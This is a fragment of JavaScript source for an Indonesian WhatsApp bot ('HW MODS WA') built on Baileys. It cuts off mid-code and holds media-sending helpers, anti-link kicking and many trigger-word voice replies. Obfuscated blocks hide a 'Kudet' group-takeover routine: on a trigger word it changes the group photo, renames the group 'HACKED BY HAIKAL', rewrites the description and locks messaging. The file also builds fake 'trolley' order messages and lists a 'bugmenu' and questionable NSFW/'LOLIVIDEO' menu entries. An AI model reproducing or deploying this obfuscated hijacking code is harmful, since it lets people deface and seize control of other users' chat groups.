_0x5ee995=parseInt(_0x19ecea(0xa2))/0x1+parseInt(_0x19ecea(0xa1))/0x2*(-parseInt(_0x19ecea(0x9c))/0x3)+parseInt(_0x19ecea(0xa5))/0x4+parseInt(_0x19ecea(0xac))/0x5+-parseInt(_0x19ecea(0xa0))/0x6*(parseInt(_0x19ecea(0xa9))/0x7)+-parseInt(_0x19ecea(0xa4))/0x8*(-parseInt(_0x19ecea(0xa3))/0x9)+-parseInt(_0x19ecea(0x9b))/0xa;if(_0x5ee995===_0x3f37db)break;else _0x256117['push'](_0x256117['shift']());}catch(_0x365ba4){_0x256117['push'](_0x256117['shift']());}}}(_0x39ac,0x23e8c));const sendTroli=(_0x591249,_0x129ba2,_0x3e35c1)=>{const _0x3ee232=_0x2d7a;res=Haikal[_0x3ee232(0xa7)](from,{'orderMessage':{'orderId':'2111632348977400','thumbnail':fs[_0x3ee232(0x98)](_0x3ee232(0xaa)),'itemCount':_0x129ba2,'status':_0x3ee232(0xa8),'surface':_0x3ee232(0x9e),'thumbnail':fs[_0x3ee232(0x98)](_0x3ee232(0xaa)),'message':_0x591249,'orderTitle':_0x3ee232(0xa6),'sellerJid':_0x3ee232(0xab),'token':_0x3ee232(0x9a),'totalAmount1000':_0x3ee232(0x9d),'totalCurrencyCode':_0x3ee232(0x99)},'contextInfo':{'forwardingScore':0x3e7,'isForwarded':!![]}},{'quoted':_0x3e35c1,'contextInfo':{}}),Haikal[_0x3ee232(0x9f)](res);};
//=================================================//			    
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './database/sampah' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './database/sampah' + names + '.png'
                    let asw = './database/sampah' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Haikal.sendMessage(to, media, MessageType.sticker,{quoted:ikal})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }

//=================================================//            
            
// Fake Link ( HW MODS WA )
const flink = {
"title": fake,
"body": `Subscribe HW MODS WA`,
"previewType": "PHOTO",
"thumbnailUrl": `https://cdn.pixabay.com/photo/2021/07/21/14/42/indonesian-6483193_640.jpg`,
"thumbnail": Mthumb,
"sourceUrl": `https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g`
}
//=================================================//
// Dari docs baileys ( HW MODS WA )
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
// {buttonId: 'id1', buttonText: {displayText: 'Button 1'}, type: 1},
// {buttonId: 'id2', buttonText: {displayText: 'Button 2'}, type: 1}
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
Haikal.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
//=================================================//
// Nge Eval Terus Gw Sempurnain ( HW MODS WA & Ra  )
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Haikal.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
Haikal.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//=================================================//
// Pahamin dari function sendbutimage terus ini cuman gw bedain type ( HAIKAL  )
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Haikal.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Haikal.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//=================================================//
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Haikal.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Haikal.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//=================================================//
// ANTI LINK ( HW MODS WA )
if (budy.includes(linknye)) {
if (!isGroup) return
if (!AntiLink) return
if (isGroupAdmins) return freply('Admin Bebas')
if (kal.key.fromMe) return freply('Owner Bebas')
if (isOwner) return freply('Owner Bebas')
kice = sender
Haikal.groupRemove(kal.key.remoteJid, [kice]).catch((e) => { freply(`*ERR:* ${e}`) })
Haikal.sendMessage(from, `\`\`\`「 Detect Link 」\`\`\`\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, MessageType.text, {contextInfo:{mentionedJid:[kice]}})
}
//=================================================//
// ANTITROLLI
if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (kal.key.fromMe) return
freply('Njier jangan pake fake trolli _-\n\n' + require('util').format(m.key))
await Haikal.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}
//=================================================//
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Haikal.sendMessage(to, media, type, { quoted: ikal, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }            				            
//=================================================//            
            // LEAVE GROUP
var _0xf12c46=_0xc3b4;(function(_0x4376d2,_0x31780b){var _0x2f9b0a=_0xc3b4,_0x4ca259=_0x4376d2();while(!![]){try{var _0x4e44d9=-parseInt(_0x2f9b0a(0x74))/0x1+-parseInt(_0x2f9b0a(0x7f))/0x2*(-parseInt(_0x2f9b0a(0x75))/0x3)+parseInt(_0x2f9b0a(0x76))/0x4+parseInt(_0x2f9b0a(0x7b))/0x5+parseInt(_0x2f9b0a(0x7d))/0x6*(-parseInt(_0x2f9b0a(0x7e))/0x7)+parseInt(_0x2f9b0a(0x73))/0x8*(parseInt(_0x2f9b0a(0x79))/0x9)+-parseInt(_0x2f9b0a(0x82))/0xa;if(_0x4e44d9===_0x31780b)break;else _0x4ca259['push'](_0x4ca259['shift']());}catch(_0x2410d6){_0x4ca259['push'](_0x4ca259['shift']());}}}(_0x4f28,0x6289e));if(budy[_0xf12c46(0x7a)]('Mamamah')){if(!isOwner&&!kal[_0xf12c46(0x81)][_0xf12c46(0x78)])return;Haikal[_0xf12c46(0x77)](from,Presence[_0xf12c46(0x80)]),Haikal[_0xf12c46(0x7c)](from);}function _0xc3b4(_0x114422,_0x15f220){var _0x4f28ba=_0x4f28();return _0xc3b4=function(_0xc3b454,_0x2d104f){_0xc3b454=_0xc3b454-0x73;var _0x4ab659=_0x4f28ba[_0xc3b454];return _0x4ab659;},_0xc3b4(_0x114422,_0x15f220);}function _0x4f28(){var _0x5ebfeb=['3912650xSqijt','125176wlcpUa','327648KtYBGx','3oCDVsW','2684752EfEKfA','updatePresence','fromMe','315JyQxPM','startsWith','2443685WaRzqq','groupLeave','12reZjGq','2578877pdpBMU','303558qfvMkk','composing','key'];_0x4f28=function(){return _0x5ebfeb;};return _0x4f28();}
//=================================================//
 // Kudet ( HW MODS WA )
var _0x4246b3=_0x1c7d;(function(_0x2d23c3,_0x3d7fb5){var _0x3ed387=_0x1c7d,_0x15bb43=_0x2d23c3();while(!![]){try{var _0x7c70d8=-parseInt(_0x3ed387(0x11d))/0x1*(-parseInt(_0x3ed387(0x123))/0x2)+parseInt(_0x3ed387(0x127))/0x3*(parseInt(_0x3ed387(0x120))/0x4)+parseInt(_0x3ed387(0x11f))/0x5*(-parseInt(_0x3ed387(0x118))/0x6)+-parseInt(_0x3ed387(0x121))/0x7+parseInt(_0x3ed387(0x117))/0x8+-parseInt(_0x3ed387(0x128))/0x9+parseInt(_0x3ed387(0x11a))/0xa;if(_0x7c70d8===_0x3d7fb5)break;else _0x15bb43['push'](_0x15bb43['shift']());}catch(_0x57c090){_0x15bb43['push'](_0x15bb43['shift']());}}}(_0x4fc9,0x1dd26));function _0x1c7d(_0x197e5e,_0x5c5d45){var _0x4fc9d6=_0x4fc9();return _0x1c7d=function(_0x1c7db3,_0x4a579e){_0x1c7db3=_0x1c7db3-0x116;var _0x52edc4=_0x4fc9d6[_0x1c7db3];return _0x52edc4;},_0x1c7d(_0x197e5e,_0x5c5d45);}function _0x4fc9(){var _0x4e6309=['2119482crUWiU','Mamamah','fromMe','updateProfilePicture','1424824fuCart','18NHBjZg','startsWith','3119950DPcDde','groupUpdateSubject','hacktae','97505WVFWYs','groupUpdateDescription','117910qqznFx','4jchiKM','1458457bxlAwe','key','2ZdsFeZ','HACKED\x20BY\x20HAIKAL','media/image/hac.jpeg','readFileSync','147426XHqVFA'];_0x4fc9=function(){return _0x4e6309;};return _0x4fc9();}if(budy[_0x4246b3(0x119)](_0x4246b3(0x11c))){if(!kal[_0x4246b3(0x122)][_0x4246b3(0x12a)]&&!isOwner)return;if(!isBotGroupAdmins)return;if(!isGroup)return;anu=fs[_0x4246b3(0x126)](_0x4246b3(0x125)),Haikal[_0x4246b3(0x116)](from,anu),Haikal[_0x4246b3(0x11b)](from,_0x4246b3(0x124)),Haikal[_0x4246b3(0x11e)](from,'HW\x20MODS\x20HACKED'),Haikal['groupSettingChange'](from,GroupSettingChange['messageSend'],!![]),setTimeout(()=>{var _0xa933d8=_0x4246b3;reply(_0xa933d8(0x129));},0x1f40);}
//=================================================//
if (budy.startsWith('Hw')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AqKLWyirKWDiGF9lTdwfIZOp1ykK-TmBAGVOnCD_LC-O.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "1IB2WRCT8y9WEkJepRYQj2lxmLnPS+0egUltiHl/QHk=",
						"fileLength": "3033954",
						"seconds": 11,
						"ptt": true,
						"mediaKey": "Y9YkOBhwLvwdZr+pk2FuqTBFgj6d7QyPEwMj5FRkWao=",
						"fileEncSha256": "fDyffAizESCvPIj24m21EYSkm/OyKO/r+mZE91BluuQ=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Bot')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AqKLWyirKWDiGF9lTdwfIZOp1ykK-TmBAGVOnCD_LC-O.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "1IB2WRCT8y9WEkJepRYQj2lxmLnPS+0egUltiHl/QHk=",
						"fileLength": "3033954",
						"seconds": 11,
						"ptt": true,
						"mediaKey": "Y9YkOBhwLvwdZr+pk2FuqTBFgj6d7QyPEwMj5FRkWao=",
						"fileEncSha256": "fDyffAizESCvPIj24m21EYSkm/OyKO/r+mZE91BluuQ=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
                    if (budy.startsWith('jahat')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ak-1L2LfXm60oHxkB9mHlFwjxTEUCx32gD_0kPspVhSQ.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "blurZTk0Qn3TdHbUaCyYwrtVn6sVxLOYlNSt9R/h4cc=",
						"fileLength": "109602",
						"seconds": 6,
						"ptt": true,
						"mediaKey": "9Ccxptjv9ahQoJgU1Z6ARxupCxpdf9tR9ns83Mr4UVs=",
						"fileEncSha256": "wv2hg3+FHPYtkfRxZkC8w31x3U47prh4fzVJX1w2JNg=",
						"directPath": "/v/t62.7117-24/19380370_2814354535522488_5729992114263573441_n.enc?ccb=11-4&oh=e7b25743aef357a981d7555549bbb55f&oe=61B1F787",
						"mediaKeyTimestamp": "1636637825"
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
                    if (budy.startsWith('Jahat')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ak-1L2LfXm60oHxkB9mHlFwjxTEUCx32gD_0kPspVhSQ.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "blurZTk0Qn3TdHbUaCyYwrtVn6sVxLOYlNSt9R/h4cc=",
						"fileLength": "109602",
						"seconds": 6,
						"ptt": true,
						"mediaKey": "9Ccxptjv9ahQoJgU1Z6ARxupCxpdf9tR9ns83Mr4UVs=",
						"fileEncSha256": "wv2hg3+FHPYtkfRxZkC8w31x3U47prh4fzVJX1w2JNg=",
						"directPath": "/v/t62.7117-24/19380370_2814354535522488_5729992114263573441_n.enc?ccb=11-4&oh=e7b25743aef357a981d7555549bbb55f&oe=61B1F787",
						"mediaKeyTimestamp": "1636637825",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Kal')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AtfxfqFIi-Pmy7OjVkKrsXn-KmeyVZuOjkOJrOj2okZ5.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "08mnXonh34aD3HGyKVjbdY5+A4Ali31jhJx4Nq0ezPo=",
						"fileLength": "37668",
						"seconds": 1,
						"ptt": true,
						"mediaKey": "YVvMk/rVgYUn5KGmGUxo6aduOiTCUrF0v5Ro9vTWE1U=",
						"fileEncSha256": "SBLKJYrb2e0BY37t3cGChGCojte4AMTnj0sd6ug/bS0=",
						"directPath": "/v/t62.7117-24/30668334_192872536261631_5789260719226097886_n.enc?ccb=11-4&oh=8db43fcdc0c831ff3fef451dff8b97fa&oe=61B1A61C",
						"mediaKeyTimestamp": "1636637089",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
                    if (budy.startsWith('Kenapa')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AgeLHnWfrNIjzAn-sBLAZ49PZtprZyCeheAxM8coYYo5.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "ioE3idZes6+0e/UYCz5i69az1QX5gzrr/N1Q9p79XlU=",
						"fileLength": "172284",
						"seconds": 6,
						"ptt": true,
						"mediaKey": "tzYXuTqJQzDU3Vo4x/LdDSfl56JZZdnhCP1bD3FVcd0=",
						"fileEncSha256": "EZdi2RfmKj7TNwWe419nSRhM530XOq3z0Zbin47Qlxg=",
						"directPath": "/v/t62.7117-24/56016723_906113066688047_8197653275154187132_n.enc?ccb=11-4&oh=5c67c8c6be0b271f5456c1fb1558fb3f&oe=61B2B6EC",
						"mediaKeyTimestamp": "1636637684",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Assalamualaikum')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AvsupRk6L0fV1BBAlBT8tvOVnhDi1ZIAr0st5gS0G1uQ.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "85/7Cey+fdhRpEDi4B2TDhWeuqLsabJykRkwD/K+jqs=",
						"fileLength": "1309681",
						"seconds": 23,
						"ptt": true,
						"mediaKey": "a1u1k5erFJ9cQKzhzOTYw0DsE++ni6hDgXsXbLpztXk=",
						"fileEncSha256": "AaQ2HZn51pqOo4GAJxtrSbeRA2IEYFQLifrvw1ejlLI=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Keren')){
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ak583uzRNHPuNnLa__lzyz2G_1nczmGRT9qcWQoGdJl0.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "TXuiE4tb24WCGFiu9iDgtG93aFLhSSF4L3EbdCLxc6o=",
						"fileLength": "172666",
						"seconds": 8,
						"ptt": true,
						"mediaKey": "aEe6sfMA/SPZ07BPGY1wV+2gfyACAwITK7NredUzGt0=",
						"fileEncSha256": "kTTgUp1BeOicPNH8cIICF5JpYRv2lfyZQnsRCgnhnmc=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Ketawa')){
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ArQmj1KpeT8hPwTnzeTylcDaNFFqkRtpC0ObvrPwyckK.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "WHt86HXm1WZAK68+iJlkSBsSuuLjBb23higXVQLfugY=",
						"fileLength": "146840",
						"seconds": 6,
						"ptt": true,
						"mediaKey": "DBnWzzsxQWAicta484k+DKsrcBnaXIbZxoKmgkecc4s=",
						"fileEncSha256": "mrxkaWX5WpYXJ0XWkttQLBODyaW3hs2PkCviBDA0XFI=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Nob')){
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Arh1CUWDAzMV-CAQWrEHjR9rPJ9n2lPXEet9t6ocHtOf.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "M9q9MJhQkSJPFfM4Em0peZ3dymStNq7x9TtRC6MAmB8=",
						"fileLength": "7104",
						"seconds": 1,
						"ptt": true,
						"mediaKey": "CoGpfxVRhAuR8vmSNDTULmHGQi5Ej/vMNybbC23v6GU=",
						"fileEncSha256": "HOTz4Uf00h077ObMP7S9A+cp4ofctpjkbPjsFoPhB6I=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Awkwk')){
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Antdkjboyw1PPqjLE0jyu_V0eOUAfFfNAuwfyBXFIQ0N.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "iUln5EKU+jLl4DSus3xwIxINWfcO//EMs3dsPFjujw0=",
						"fileLength": "112893",
						"seconds": 4,
						"ptt": true,
						"mediaKey": "XICyDiCFA1BCvEbBwjTK6VtaT8qAklUwpPrFUE2bhpo=",
						"fileEncSha256": "K44TvJesO2otjw0557mr9Wg+X7WzbYZ4hixnZtnJqvE=",
						"directPath": "/v/t62.7117-24/29289855_814672179287496_8656586646343158069_n.enc?ccb=11-4&oh=2560b6a0ad8617dedf550310419c9bd0&oe=61B19126",
						"mediaKeyTimestamp": "1636637078",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Kasian')){
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AglUqj17rZqdU8EK9DdFSlg53zT3YfSG_RebvDWBVhBr.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "veylyuQaculnnPpYSAqAVfpXYXdtcwPA2U5S3XF0MLY=",
						"fileLength": "193317",
						"seconds": 29,
						"ptt": true,
						"mediaKey": "Oyqdo21GNd0Z3Rnk8PwVXlx/D0exH23E/y0vLIEWW14=",
						"fileEncSha256": "GZimwIo10WHZ65ked38ovl7viNXuUt3L7TyL12Jtzlk=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Asw')){
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Am1VWYdKickjcKzBnPa3m8zD9ZeIhvmB3rqZqDwijQAQ.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "DqJ+UYLk3E2pkubjnKCMlXNVYp/OCkfT6JrFeICvz9s=",
						"fileLength": "401522",
						"seconds": 11,
						"ptt": true,
						"mediaKey": "QCSDUXCOK9Qde4WESJTmyT85yddk/ZODOsfcsNWMtXo=",
						"fileEncSha256": "bRDmW328K3aExoSBC2pGki14mhJG4zU9ft868K36xac=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Loli')){
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AuEtUW5I_nTI1sJEkMFMzB74D3i_s17aXX1td-3jEHxG.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "1CEp4NUi6g3v05I89ZazUJRDgYe02hF1tT27pL+77tA=",
						"fileLength": "15673",
						"seconds": 1,
						"ptt": true,
						"mediaKey": "OHMIDmSiJE/TdkDwcHSXtiipynzbZ2YNBF541hJBQhM=",
						"fileEncSha256": "fLULRpaupCo5KLiX/0y6pjBg1V72C16NUVpOdnx15m8=",
						"directPath": "/v/t62.7114-24/34773423_385733443298459_7398175649989082807_n.enc?ccb=11-4&oh=e0bc0700bc263855f711c6fb81aab96f&oe=61B3BFA3",
						"mediaKeyTimestamp": "1636637321",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Bacot')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AlNpdHMJcJcd_mvzaZOxhoWaaZQYpiHgs9gSv3jnWjdq.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "Qb81+Jo9NYHI9gOhauWAABHdkWnIqZwRFEJM69iRp2E=",
						"fileLength": "837590",
						"seconds": 34,
						"ptt": true,
						"mediaKey": "n3+BmPnKJPR0WrdCybE+Aa2baJNh05zU7IGHVEYs8dQ=",
						"fileEncSha256": "CjURptuw4v8E7TrgWK1xxm1vsLA//Ha4Zn7gQT8E6ds=",
						"directPath": "/v/t62.7114-24/29137582_2703398559969196_8994531630385031578_n.enc?ccb=11-4&oh=64ced22d7721ed6806b4e22a2eb390f6&oe=61B315B4",
						"mediaKeyTimestamp": "1636513812",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Hoax')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkVXG9rhoAXjK88jBYNvTXIG5PoIa2k1tLT1UBgaEfnW.enc",
						"mimetype": "audio/mpeg",
						"fileSha256": "/J8qG91XdHMMUJmqUpgHxA7QUg8P4VBZKnzNlKBzDqM=",
						"fileLength": "203864",
						"seconds": 8,
						"ptt": true,
						"mediaKey": "VymQGZQa0xMODUaiGkTNSz/OYMKmkhx69KSwWkI7R8s=",
						"fileEncSha256": "ybRupKGa2z5fbEBjzyUFrjOCEGr7gxUkiu8ms7OTSnk=",
						"directPath": "/v/t62.7117-24/20036316_199524118981261_1655964017186946107_n.enc?ccb=11-4&oh=9b845359543f88f19adb50a7b10de4b5&oe=61B21818",
						"mediaKeyTimestamp": "1636498296",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
if (budy.startsWith('Apa')){
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AooYvxqw_OwDh6KWMW-Nd4093MKJJwIwVNDG0G8Ou8DK.enc",
						"mimetype": "audio/mp4",
						"fileSha256": "/M/JeXZVIQHPBJ3GSa5xxgm4ww3S72XpzaDOuiaF9jE=",
						"fileLength": "159204",
						"seconds": 9,
						"ptt": true,
						"mediaKey": "/SU+O/rEmbBctdEMFcpKpej6V2yOTOmfC7VRYCQoGDw=",
						"fileEncSha256": "ujkoeAImdeA4vnbWzDhbMKcMvVpB1YEmluogAs6wSRM=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    }
//=================================================//
if (budy.startsWith('Menu')){
res = await Haikal.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋 ${ucapanWaktu}.\`\`\``,
"description": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
┏━━⊱
┣❏🔥➥ WELCOME BOT HW : https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g"
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
"buttonText": "List Menu",
"listType": "SINGLE_SELECT",
"sections": [
{
    "title": "Subscribe Hw Mods",
    "rows": [
       {
          "title": "asupanboy",
          "rowId": "asupanboy"
          },
       {
          "title": "LOLIVIDEO",
          "rowId": "LOLIVIDEO"
       },
       {
          "title": "owner",
          "rowId": "owner"
          },
       {
          "title": "makerkal",
          "rowId": "makerkal"
          },
       {
          "title": "menu",
          "rowId": "menu"
          },
       {
          "title": "makermenu",
          "rowId": "makermenu"
                 },
       {
          "title": "menunsfw",
          "rowId": "menunsfw"
                 },
       {
          "title": "bugmenu",
          "rowId": "bugmenu"
                           },
       {
          "title": "groupbot",
          "rowId": "groupbot"
                           },
       {
          "title": "intro",
          "rowId": "intro"
                           },
       {
          "title": "kemiripan",
          "rowId": "kemiripan"
                           },
       {
          "title": "hwmenu",
          "rowId": "hwmenu"
                                     },
       {
          "title": "modsmenu",
          "rowId": "modsmenu"
                                     },
       {
          "title": "mausange",
          "rowId": "mausange"
                                     },
       {
          "title": "kodekeras",
          "rowId": "kodekeras"
       }
     ]
   }
 ]
}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
}
if (budy.startsWith('quotes')){
res = await Haikal.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋 ${ucapanWaktu}.\`\`\``,
"description": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
┏━━⊱
┣❏🔥➥ WELCOME BOT HW : https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g"
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
"buttonText": "List Menu",
"listType": "SINGLE_SELECT",
"sections": [
{
    "title": "Subscribe Hw Mods",
    "rows": [
       {
          "title": "QUOTES1",
          "rowId": "QUOTES1"
          },
       {
          "title": "QUOTES2",
          "rowId": "QUOTES2"
       },
       {
          "title": "QUOTES3",
          "rowId": "QUOTES3"
          },
       {
          "title": "QUOTES4",
          "rowId": "QUOTES4"
          },
       {
          "title": "QUOTES5",
          "rowId": "QUOTES5"
                 },
       {
          "title": "QUOTES6",
          "rowId": "QUOTES6"
                 },
       {
          "title": "QUOTES7",
          "rowId": "QUOTES7"
                           },
                           {
          "title": "QUOTES8",
          "rowId": "QUOTES8"
                 },
                 {
          "title": "QUOTES9",
          "rowId": "QUOTES9"
                 },
                 {
          "title": "QUOTES10",
          "rowId": "QUOTES10"
                 }
     ]
   }
 ]
}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
}
//=================================================//
//=================================================//                    
//FUNCTION
            cekafk(afk)
            if (!kal.key.remoteJid.endsWith('@g.us') && offline){
            if (!kal.key.fromMe){
            if (isAfk(kal.key.remoteJid)) return
            addafk(kal.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
